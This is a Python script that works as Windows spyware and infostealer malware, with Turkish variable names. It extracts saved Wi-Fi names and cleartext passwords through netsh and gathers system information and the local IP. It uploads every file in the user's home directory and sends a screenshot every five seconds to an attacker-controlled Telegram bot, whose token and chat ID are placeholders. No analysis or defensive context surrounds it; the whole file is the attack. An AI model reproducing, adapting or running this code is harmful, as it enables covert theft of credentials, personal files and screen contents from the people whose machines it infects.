import threading
import time, socket , pyautogui ,requests , os, subprocess



if os.name == "nt":
    chat_id = ">>>>>CHAT-İD>>>>>>>>"
    Bot_Token = "<<<<<<<BOT-TOKE<<<<<<<"

    def internetinfo():
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        for m in output:
            if "All User Profile" in m:
                value = m.split(":")[1][1:-1]
                out2 = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', value, 'key=clear']).decode('utf-8').split('\n')
                for s in out2:
                    if "Key Content" in s:
                        valuePass = s.split(":")[1][1:-1]
                        data = value + " || "+ valuePass
                        submit = {'text': data}
                        requests.post("https://api.telegram.org/bot" + Bot_Token +"/sendMessage?chat_id=" + chat_id,data=submit)

    def systeminfo():
        info = subprocess.check_output("systeminfo",shell=True)
        ip_address = socket.gethostbyname(socket.gethostname())

        submit = {'text': info}
        submit_ip = {'text': ip_address}

        requests.post("https://api.telegram.org/bot" + Bot_Token +"/sendMessage?chat_id=" + chat_id,data=submit)
        requests.post("https://api.telegram.org/bot" + Bot_Token +"/sendMessage?chat_id=" + chat_id,data=submit_ip)

    def screenshot():
        while True:
            konum = os.path.expanduser("~")
            file_ = "key.png"
            #################################
            screenshots_ = pyautogui.screenshot()
            screenshots_.save(str(konum + "\\" + file_))
            #################################
            dosya = open(konum + "\\" + file_,"rb")
            image = {'photo': dosya}

            requests.post("https://api.telegram.org/bot" + Bot_Token +"/sendPhoto?chat_id=" + chat_id, files=image)
            dosya.close()
            #################################
            os.remove(str(konum + "//" + file_))
            time.sleep(5)

    def send_file():
        path = f"C:\\Users\\{os.environ['USERNAME']}"
        os.chdir(path)
        for root, dirs, files in os.walk(path):
            for file in files:
                submit = os.path.join(root, file)
                try:
                    pass
                    dosya = open(submit,"rb")
                    files = {'document': dosya}
                    requests.post("https://api.telegram.org/bot" + Bot_Token +"/sendDocument?chat_id=" + chat_id,files=files)
                except PermissionError:
                    pass


    if __name__ == "__main__":
        systeminfo()
        internetinfo()
        send_f = threading.Thread(target=send_file(), args=())
        send_f.start()
        ss = threading.Thread(target=screenshot(), args=())
        ss.start()
